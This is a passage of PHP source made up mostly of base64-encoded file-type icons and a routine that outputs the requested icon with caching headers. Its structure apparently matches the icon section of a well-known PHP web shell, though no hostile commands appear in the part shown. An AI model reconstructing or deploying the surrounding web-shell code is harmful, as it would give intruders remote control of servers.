"AAjgACsJrDRHSICDQ7IMXDgJx8EvZuIcbPBooZwbBwOMAfMmYwBCA2sEcNBjJCMYATLIOLiokocm".
"C1QskAClCxcGBj7EsNHoQAciSCC1mNAmjJgGGEBQoBHigKENBjhcCBAIzRoGFkwQMNKnyggRSRAg".
"2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF".
"CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA".
"Ow==",
"ext_ocx"=>
"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAIAAAP8AAP//AAAA/wD/AACAAAAAgICA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARKMMlJq704620AQlMQAABlFMAwlIEgEESZnKg6tEJwwOVZ".
"IjfXKLHryRK4oaRDJByQwlQP1SQkUypAgdpsDYErruRAOpaPm7Q6HQEAOw==",
"ext_pcx"=>
"R0lGODlhEAAQADMAACH5BAEAAAoALAAAAAAQABAAgwAAAMDAwP///4CAgIAAAICAAP//AP8AAAAA".
"gAAA/wAAAAAAAAAAAAAAAAAAAAAAAARgUKlBqx0yDyEACBxHZRMXDGC4YQOwCVQKdJ7bggcBtl8Q".
"AJNfIBcoGD4CH1CBSAByxp5pOUAgCFFf6HexIKeore+2BaJ8p1sqaU6NpdOgiQJny5On+u+e7qH3".
"EzWCgwARADs=",
"ext_php"=>
"R0lGODlhEAAQAJECADZOogAAAAAAAAAAACH5BAEAAAIALAAAAAAQABAAAAIolI+pywIPG1CzWReD".
"0bB6oYGO4WXBiT0kEnJJtcXwJc2kvb51R/d0AQA7",
"ext_pif"=>
"R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".
"/////ywAAAAAEAAQAAAEO/DISasEOGuNDkJMeDDjGH7HpmYd9jwazKUybG+tvOlA7gK1mYv3w7RW".
"mJRRiRQ2Z5+odNqxWK/YrDUCADs=",
"ext_pl"=>
"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo".
"GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7",
"ext_png"=>
"R0lGODlhEAAQADMAACH5BAEAAAoALAAAAAAQABAAgwAAAMDAwP///4CAgIAAAICAAP//AP8AAAAA".
"gAAA/wAAAAAAAAAAAAAAAAAAAAAAAARgUKlBqx0yDyEACBxHZRMXDGC4YQOwCVQKdJ7bggcBtl8Q".
"AJNfIBcoGD4CH1CBSAByxp5pOUAgCFFf6HexIKeore+2BaJ8p1sqaU6NpdOgiQJny5On+u+e7qH3".
"EzWCgwARADs=",
"ext_reg"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgACAgMDAwAD//wAAAAAAAANM".
"aCrcrtCIQCslIkprScjQxFFACYQO053SMASFC6xSEQCvvAr2gMuzCgEwiZlwwQtRlkPuej2nkAh7".
"GZPK43E0DI1oC4J4TO4qtOhSAgA7",
"ext_rev"=>
"R0lGODlhEAAQAFUAACH5BAEAAD8ALAAAAAAQABAAhQAAAOvz+////1gdAFAAANDY4IYCU/9aZJIC".
"Wtvi7PmyheLq8xE2AAAyUNTc5DIyMr7H09jf5/L5/+Dg8PX6/4SHl/D4/5OXpKGmse/2/ZicqPb6".
"/28aIBlOAMHI0MzU3MXFHjJQAOfu9d7k7gA4Xv//sRVDAI0GUY0CU+Hn8ABbjfFwOABMfwhfL/99".
"0v+H1+hatf9syvRjwP+V3gA4boCAAABQhf+j5f++8P950FBQAN/n8PD2/HNzAABilgAAAAaRwIFw".
"SCz+MJpLhdMzOJ9PAqRQmJxKuNvs5crFZDBCwSIQcECItDqNIlAkGcejRqjb74C8fs8/JiskLD4e".
"BRERCSMpIg1TVTYqAZGRPBsCCw1jZTSVZZ0CAZdvcQ+SBwqfn5d8pacBqX5KJgEHtAcrrTsMjRM6".
"rKgLBQyZAiG+rh8tDKJyCc3OEQUdHQx81Xs/QQA7",
"ext_rmi"=>
"R0lGODlhFAAUAKL/AAAAAH8Af//4/8DAwL+/v39/fwAAAAAAACH5BAEAAAMALAAAAAAUABQAQANS".
"OLrcvkXIMKUg4BXCu8eaJV5C8QxRQAmqBTpFLM+nEk3qemUwXkmvxs3n4tWOyCRk5DKdhi0JYGpk".
"QFm6oNWyylaXud8uxI2Oe8zig8puf5WNBAA7",
"ext_rtf"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
"ext_shtm"=>
"R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAIdjI+pq+DAEIzpTXputLi9rmGc".
"ETbgR3aZmrIlVgAAOw==",
"ext_shtml"=>
"R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAIdjI+pq+DAEIzpTXputLi9rmGc".
"ETbgR3aZmrIlVgAAOw==",
"ext_so"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6".
"WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ".
"AAA7",
"ext_stl"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAgwAAAP///wCAAMDAwAAAgP//AICAgICAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARYEIlJK0VYmDE294YAZEMQFCZ6DiJpBsNRmuwoDephHGqd".
"GanYLBCyCYavYOsWIDQJUKePeXr1lprmM1ooklRJGrbkjEJhY7B6qvlwOh+sZb5EAO74PB4RAQA7",
"ext_swf"=>
"R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O".
"nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA".
"GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".
"NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",
"ext_sys"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAgv///wAAAICAgMDAwICAAP//AAAAAAAAAANJ".
"aLLc9lCASecQ8MlKB8ARRwVkEIqdqU0EEXCDqkxB4VZxSBTB8lqyTSD2+eVWE0lP8DrORgMiwLkZ".
"/aZBVOqkpUa/4KisRC6rEgA7",
"ext_tar"=>
"R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC".
"Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF".
"HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD".
"UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p".
"uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg".
"GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd".
"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".
"u4tLAgEAOw==",
"ext_theme"=>
"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAAD/AAAA/wCAAAAA".
"gAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
"FxEAOw==",
"ext_txt"=>
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
"UpPWG3Ig6Hq/XmRjuZwkAAA7",
"ext_url"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg4CAgAAAAMDAwP///wAA/wAAgACAAAD/AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARdEMk5gQU0IyuOMUV1XYf3ESEgrCwQnGgQAENdjwCBFjO7".
"Xj9AaYbjFArBme1mKeiQLpWvqdMJosXB1akKbGxSzvXqVXEGNKDAuyGq0NqriyJTW2QaRP3Ozktk".
"fRQRADs=",
"ext_vbe"=>
"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMAAAP8AAAAAAAAAAAADRii63CEgxibH".
"kwDWEK3OACF6nDdhngWYoEgEMLde4IbS7SjPX93JrIwiIJrxTqTfERJUHTODgSAQ3QVjsZsgyu16".
"seAwLAEAOw==",
"ext_vbs"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAICAgMDAwAD//wCAgAAAAAAAAAAAAANQ".
"GLrcECXGJsWTJYyybbTQVBAkCBSgyKGPl2YjCcwnG2qrV13TQBI6GwbXqb0yCgCJJYSZOK4LZPDY".
"DHSvgEAQAGxrzQKNhgFtz+j0eM2eJQAAOw==",
"ext_vcf"=>
"R0lGODlhEAAQADMAACH5BAEAAAoALAAAAAAQABAAgwAAAMDAwICAAP//AAAA/4CAgIAAAAAAgP//".
"//8AAAAAAAAAAAAAAAAAAAAAAAAAAARYUElAK5VY2X0xp0LRTVYQAMWZaZWJAMJImiYVhEVmu7W4".
"srfeSUAUeFI10GBJ1JhEHcEgNiidDIaEQjqtAgiEjQFQXcK+4HS4DPKADwey3PjzSGH1VTsTAQA7",
"ext_wav"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
"ext_wma"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
"ext_wmf"=>
"R0lGODlhEAAQADMAACH5BAEAAAoALAAAAAAQABAAgwAAAMDAwP///4CAgIAAAICAAP//AP8AAAAA".
"gAAA/wAAAAAAAAAAAAAAAAAAAAAAAARgUKlBqx0yDyEACBxHZRMXDGC4YQOwCVQKdJ7bggcBtl8Q".
"AJNfIBcoGD4CH1CBSAByxp5pOUAgCFFf6HexIKeore+2BaJ8p1sqaU6NpdOgiQJny5On+u+e7qH3".
"EzWCgwARADs=",
"ext_wri"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
"ext_xml"=>
"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
"IQA7",
"ext_xsl"=>
"R0lGODlhEAAQAEQAACH5BAEAABIALAAAAAAQABAAhAAAAPHx8f///4aGhoCAAP//ADNmmabK8AAA".
"gAAAmQCAgDP//zNm/zOZ/8DAwDOZAAAA/zPM/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAV3oDSMZDlKqBgIa8sKzpAOr9s6gqzWPOADItZhpVAwhCvgIHBICBSCRQMh".
"SAyVTZZiEXkgVlYl08loPCBUa0ApIBBWiDhSAHQXfLZavcAnABQGgYFJBHwDAAV+eWt2AAOJAIKD".
"dBKFfQABi0AAfoeZPEkSP6OkPyEAOw==",
"1"=>
"R0lGODlhGAASAPZKAAICAgISCgI6EgJqFj6aIkyiJhqWIg6WIgJ6GkKeIk6mJgJSFgJOFAIyEgJe".
"FjaKHkKSHkKOHgI+EiJyGjqCGjaCGj6KImKqQmauSgJGEipyFip2Gi52GgJWFgIqDjZ+HiJ+LgJW".
"GgJKEhBQGSZuHiJuFiJqFgImDlrOQiJuGiZ2HAJaFyaCHDKSHi5+GhJmFh5iFxpiFl6iQhp6Li6O".
"HkLCKjqqJjKCGhZuFhpaFhZaFgJeGjaqJj6yJjJ+Gi56GgJSEgJmGhZOFiJaGiZmIi52KkKKNlKe".
"PmKySnLGUnrWWip6GjaaIjKOHgJyGgIWCgoeCgIuDgJiFh5yFhJaFg5qFgp2GgqCHgJmHgJuGiZy".
"FiJmFiKCHiaOHg5OElqaQiqGLgJ2GipyGiZqGiJmGip+HiqOIi6WJhImFgJ+HhiCGiJ6GiJqGh5m".
"GiJ2GiaKHgImCkKONh52GhZyFhZ2GhZ+GhaGHlaWQmKmRl6iRgIiCwIeCgIaCgI2EgAAAAAAACwA".
"AAAAGAASAAAH/4AAAQIDBAUGAYiKiYwHjQGDCAkKBQsBlpiXmpkMAQ0ODxAREKSlpqemEhMUFa2u".
"rhYXGLO0tRkaGxwdHhm5uR8YICELGcUZIiIMDCMkJSYnKB4lJSkqGB0iKywtLi/FycswMTELJxkw".
"6DIzDCs0NTY3GzgZDAsdIzk5Ojr5/Rg7DFTw6OHjBwcNIoA4CDJCyBAiRYwcQZJECYYVC5YwafLD".
"4AaFA5yMeALlRBQJIjpIGfBvxZQbBTds0EClipUrIwJE0RnAA6QAGLBIyaKFg68tMCZw6ZLTSwAR".
"ATL8/AImS5gJYjaIGUOGRBkzZ3L+HBsADYY0atakYNOGDBs3LEfemMm5c6dPOJDMxuEiB4ffOXTq".
"qLHT9GnUwxLK3sGAJ4/jPHhoiSVLufJPujzvBsCLV08Az3sC8BEdoDBUqVITJ+7jqbXmQAA7",
"2"=>
"R0lGODlhPwASAOUDAFmwLFGkJUKQHmauSgBNEgBOEgBYFgBXFgBlGQBkGQByGgBxGgBzGgqAHQCB".
"HQ2BHQqCHRCCHSWNHySOHyWPICePICuXJSyWJSmXJSmPICeQISaPIBaFHQAQCgAZCgAXCgAWCgAU".
"CgASCgAlCgAhCgAfCgAbCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAPwASAAAG40CAcEgsGo/IpBIZ".
"aDqf0Kh0Sq1OBdisdsvter9g72BMLpvP6LR6nS643/C4fE6v2+/4vH4vNxz+B35/BoSCgYWAh4SJ".
"iIqLgYyJkokIlZaXmJmam5ydmwqgoaKjpKWmp6imEA4QrayrrbGys6+ztreuuLMPEBESv8DBwsPE".
"xcbHwxobFhfNF8zPztHT09DN0NbZ0tbU0s7QGeHhGuLi5OXo6eYa5+ru7xkbHPP09fb3+Pn6+/ls".
"/v8A/4kYSLCgwYMIEypcmNCDCBAPIzKcSLGiwREiSIgoIcKhQ4gQLYocKSIIADs=",
"3"=>
"R0lGODlhBgASAOUDAFmwLFGkJUKQHmauSmGoQz2IIDeCGwBUFwBZGiB/LjR+Hyt2GQBOEgBPFABV".
"Fyl0HgBXFgBYFwBbFwBjGTCEMFmiQQBmFwBpFwBtGQBzGhKCIGWtSgB2GwB6HQB/HQCCHRuIHwCE".
"HRCGHRKJHRKLHR2PICWPICSPIC2XJCyWJSmXJCmWJCmaJUOMO1iYQimPICyPIhImFB+IHySOIUGK".
"OAAQCliXQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAABgASAAAGSkCAcBgoGgXI5GBA".
"KBgMEERioFgwGA3I4AGRSCaUiuWCyWgGnI7nAxqERKNRaTAz2VGDFEvfcsH+MAMxMjM0gjVLNjE1".
"jI2Oj49BADs=",
"4"=>
"R0lGODlhQgASANQJAFmwLFGkJUKQHjeCGyt2GSFsFx1gFhtZFIrdY4zdZIndYobdYoPdYILdX4Dd".
"X3/dXgBvGQBuGQBwGQAQCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAA".
"QgASAAAFlSAgjmRpnmiqrkHrvnAsz3RtC3iu73zv/8DgYEgsGo/IpHLJJDif0Kh0Sq1ar4Wsdsvt".
"er/gsNhALpvP6LR6zW4f3vC4fE6v2+94hB6R6Pv/fnoJeguFhgiFDIqKDY2OjQ+GC3uCgJYRmJma".
"m5ydnpgSn6KeE6Wmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsMhADs=",
"5"=>
"R0lGODlhIQASAPYtAFmwLBqWIAASCg2VIEugJD6YIABqFwA6EAAAAFGkJQBSFABOFE2iJE6lJUKd".
"IgB5G0KQHkGPHTaJHQBdFgAzEDeCGzuBGiBxGQA+ECt2GQAtDQBFEi53GSpwFyFsFwAnDVrNQgAq".
"DSFqFyVsFxBQGR5hFhtgFhtZFBdZFIDdX3/dXobdYondYozdZInaYofYYYPTXn3MW3jEV3G6UWix".
"TF+lRVWYP0qLODx7LjNvKShhIRlYHRJQFxRKFA1GEgBuGQBlFwBaFABUFAAzDQ0dCgoZCgoWCgAW".
"CgAaCgAeCgAiCgAlCgA3EABKEg1OEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwA".
"AAAAIQASAAAH/4AAgoOCAQKGiIeKA4sCAAQFBgcCCAmWl5YKApqcm56dCwIJDA0OD5MQqaqrrK2u".
"ERASExQVtba3uLm6tRYXGBnAwcLDxMMKGhscGR0bHs7P0NHS0R8gISIeIyQl3N3e3+DfCh8bJtwk".
"J+nq6+zt7ijwJiQpKSor9yss+votLSwuL2DEkDGDRg0bN3Dk0LGDRw8fJH5InEixokQDQCYEEbJg".
"A4YhGj4QKWJEAAkBAo6kXIlEQMuWSQQokSlgSc2bIQRo0GnypYCYM23azElBQFEmAjAkFbCBqYAm".
"ApyYREm1qtWrWK2eXKlSpU+YNIPeHMpzJwmfQMcKIGpUAFKlSiObNoUqdWvWu3ipbu3K0qXftGKF".
"ri3b8y9NwWyPLo3rlK7JQAA7",
"font"=>
"/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAACgAA/+4ADkFkb2JlAGTAAAAAAf/b".
"AIQAFBAQGRIZJxcXJzImHyYyLiYmJiYuPjU1NTU1PkRBQUFBQUFERERERERERERERERERERERERE".
"RERERERERERERAEVGRkgHCAmGBgmNiYgJjZENisrNkREREI1QkRERERERERERERERERERERERERE".
"RERERERERERERERERERERERE/8AAEQgAlACUAwEiAAIRAQMRAf/EAHAAAAMBAQEAAAAAAAAAAAAA".
"AAACAwEEBgEBAAAAAAAAAAAAAAAAAAAAABAAAQMDAwMCBQIFBAMAAAAAAQAR4iGhAjESA0FhcVEi".
"8IGxwRPhwvFSgvIE0TJCYnKSohEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8A85yO+rfO".
"SMMvTp3kjIkmvyrJPjk3WnmSCZyJLuPj+pM2QZ+veSTLlr28yVMeQkit5IMz4wA4y+P/AGUiW63k".
"unPMnWnx/wCS5ssvT6yQU489oZ9e8kFvW8k/DmG/WSjvO7W8kDbiOr/OSMcq0+slu7veSwcvobyQ".
"Bc6m8kbm63kjLItreSmM263kguSRi7hvMlIE7daeZLTyk47fvJZv9rPeSB+PlFHN5JuUhwxvJQxI".
"epvJVJALfeSBcvR7yWYgkt95KmTNreSXHLIGhf5yQY3Tr5khbuL9/MkIH5eQO7v85KQzJ63ktJ9r".
"veSUZt1vJBmRY1N5JvyBh27ySnJ6veSelK3kgtnlUg0Px3UTlVwbyVTlj0L/AB5UX73kgph7tcm+".
"clI5B6GnmSfAEuX7ayUiWOt5IH30d7yWYZN1vJLuej3kqYgnreSBs83x1vJSf1N5J26veSXI97yQ".
"dGO3Z8vWSRxs1r5kjEPjreSwYvjue8kExUO95LTyHqbyW8ebGpvJNzZuQxvJAm/veSrxkvreSgcj".
"63kqcRJOtPMkGv7nfr6yQt7PeSEGZ5FyD9ZJMcvU3kqZkklzeSHp7vrJBPLIPreSCSCK3kinQ3km".
"3gsB9ZIH5c2AANR/2/UKb97yVs8AA73ko5HveSCmPLtDfeSi7nW8lTHHdiwNX9ZKbt1f5yQGXq95".
"KoY1fp6yU3y9byVMX13afH8yBeTJgz3ksGYNHvJGWXTL6yWBh1vJBYPtcZfJ5KR5CcWGnmSc8hAH".
"j1kp45tT7yQbhkOpp5kmzOIIA+slmIchzeSblYEMbyQKW9byTY57TreSzIhqGvmSkSfW8kFvyV1v".
"JCVy2tfMkIN5OYE0L/OS0ZuKG8knKQDT6yT8eQABe8kGFuv1knOeIY4mvmShnybsne8lXEilbyQY".
"f8g5UJp5kkOXe8lbkxxxLg9fWSm/e8kG8eJy6t61ksdtDeSpxAkODr3koZ51Z9O8kGnkagN5Jxyg".
"9byUX73kqOB1vJBQl8XBr5kpO3W8lhyOr3kmJ7695IN3ECj+XkgY+13vJWxzGxn6eslHcW1p5kg3".
"HIir3ksy5zkdbyWDKoreSCADQv8AOSBssgRrXzJKC9HvJYToXvJNjlV3vJAbqs9fMkJfy+7W8kIN".
"5BtLPeSMPN5Izy9TXzJbg563kgnka0N5LRmSQHvJNl7Sz3kkGTHW8kHTy4ZYiuT/ADkucEvreSuf".
"8jeGP1kkOVdbyQU4ssgA1X7yXPmfca3kuri5RjiQTV/WS5+TJ8nBp5kgmS3W8loJPW8kwyB63kmx".
"yGNXvJApyo33kjfUVvJWzO7HdoK/GqiD3vJAEFv1kgZ0b7yXTjyDYzjT1kpbwBrXzJACoYm8kcjY".
"ZMDeSOM7tTTzJbyjHEit5IJ5Gmt5JsMhiam8kZZgdbySb3qDeSBt2O93p5khJ11vJCB8uQEu95IH".
"K1B9ZIzGzrTzJKM2IL3kgw51qbyTZ9jeSCXOtPMlmWTChvJBozb+MkmRrreSbHkHU3kseut5IOr/".
"AByAKm8lLMsSQbyWYEHreSUcrn9ZIDcDqW+ck4yx9byWbu95Jg3reSDCCQ708ySu3W8lXPNsaGnm".
"S5xyepvJBfHEbO/mSk3td7yTa47hleSXHIka08yQHGcnobyW8m5wcjeSbHMBq3kt5Mjk3T5yQSyJ".
"P8ZJ8GBd7yQdNbyWYgks7jzJAbxud7yQl9rs95IQPyA0BN5KenW8lXk5NzMdKayUhm9AbyQBypre".
"Sw5uNbyWkt1vJA7m8kGP3vJG7veSYZd6eZIJrreSBRkRV7yRjlXW8lXjALv9ZJMvaTWg7yQZln0e".
"8lozINTeSXd3vJM/w8kD5Znb+slHd3vJdBOO0jQ+ZKIHqbyQaOUtte8kwy9rPeSMdur18yT45A4d".
"/MkGcf8AM/X1kn5+bEttN5KfQl6eZJMyKAGnmSDTyd7yW4cjn9ZJMqdbyTcZ73kg1qt18yQm/IHd".
"7yQgzLIavr3kkNKg3km5CMdDeSXHMk63kgN/V7yTFmBB17ySZmut5IORYVvJA+BHU3kkyzrreSMM".
"u95Jz8VkgfibIO95JMg2RreSfiJqx07yU8+Ri5NfMkAcgOt5KgzB0N5Ln3P1vJbubreSDpzwYO95".
"KDtV7yTfnLN95LH7695IKBzj/up5kkFA73knx5iAB95JTmWp9ZIDfqH17yUn73krAghnr5kt5Msc".
"urHzJBHcepvJNhk51vJaR3vJGPIMTreSAY7tr3khDl9z18yQgzIsKm8kmJcs95J+XMZMxvJLiSC7".
"3kgCW63ktOb0+8kHNyS95LciWDG8kGA97yWDMuz3kgZd7yT6dbyQNhltBL08yU+XJ8nfXvJUxzAB".
"B+slPkz3VfXvJAm7veSbd3vJYC/W8k7j1vJBhyG3WvmS05UFbyQzhwbyWP0e8kFN4Ad3PnT/AOkn".
"5faz3kr45DbqNPWSmcBt3PeSDOPIUreStysQP9ZLlxJ9aeZKuZ29aeZIDIBtbyS7gOt5JDmT1vJO".
"MgRreSBfy/DyQl6s95IQV5d1H/clG743IQgT3dP3Kvu+NyEIEx3fG5GX5H/uQhA2O7/l+5FXpp/U".
"hCBMn6fuW4bvjchCBzvamn9SQbuv7kIQWDtRnb/son8jV0/qQhBuO7b/AHIz/J1/chCBDu+Ny3Dc".
"/wDchCA97/3IQhB//9k=",
"pdisk"=>
"R0lGODlhEQAMAOZkAODg34mJicfHx4GBguHh4WxsbObm5dDQ0H5+fnl5eYKCgv3+//Ly8t/f3svK".
"yqKios/PzsDAwKempktKS87NzaCgoE5OTnFyco2NjLu7u1JRVvf4+Pv+/4CAgMHAv9LS0mVldFdX".
"V0VFSsTDw7i4uXZ2dqSjpKWkpNzb24uLkMzM3efn5uzr60NDRoSEjmhnZ6usq+Tk49HR0HJyco6O".
"jlNTW3Z2hNjY2MHBwfHw8Dw8P9XV1KOjpNnZ2MvLytzc24mJjXh4ipeXl2JjY5STk25vdYqKiamp".
"qV1dXunp7Gxsa52cnHl5fZiYtrq6u9TU1ExMTq+vrvb3+FNTU+7t7srJyTQ0NO3s7Ozs63t8fE5N".
"Urq5unBwdZqamujn54CAktbV1X18fbW1tdTU0wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5".
"BAEAAGQALAAAAAARAAwAAAeLgGSCg4SFhoeIZCwoAmArFDtPC4UxABkJBSQMC1cAGw44PoNOYw0C".
"BAAMHFgNUkkqKUBeZBVLYqcGBzcfI11MLV82CGQSUUIKJlsyNJgDQ1ZNQUpkOQEBVTwdCmEWFwhF".
"IBpTWYMeAyUYJ1w6IjVQITNHP4RUEEQvLloTSAERBok9YBh5cCCRQUKBAAA7",
"odel"=>
"R0lGODlhEQAPAKIEAFQhHFQhG1MhG5QaHQAAAAAAAAAAAAAAACH5BAEAAAQALAAAAAARAA8AAAMq".
"SLrc/jDKIZoYb+iqgsbOVwFf9JGaRHypilLqxQaRl4rPu+AhuPuqYDABADs="

);
$imgequals = array(
"ext_tar"=>array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
"ext_php"=>array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml"),
"ext_htaccess"=>array("ext_htaccess","ext_htpasswd")
);
 ksort($arrimg);
 if (!$getall)
 {
  header("Content-type: image/gif");
  header("Cache-control: public");
  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  header("Cache-control: max-age=".(60*60*24*7));
  header("Last-Modified: ".date("r",filemtime(__FILE__)));
  foreach($imgequals as $k=>$v)
  {
if (in_array($img,$v)) {$img = $k;}
  }
  if (empty($arrimg[$img])) {$img = "small_unk";}
  if (in_array($img,$ext_tar)) {$img = "ext_tar";}
  echo base64_decode($arrimg[$img]);
 }
 else
 {
  echo  "<center>";
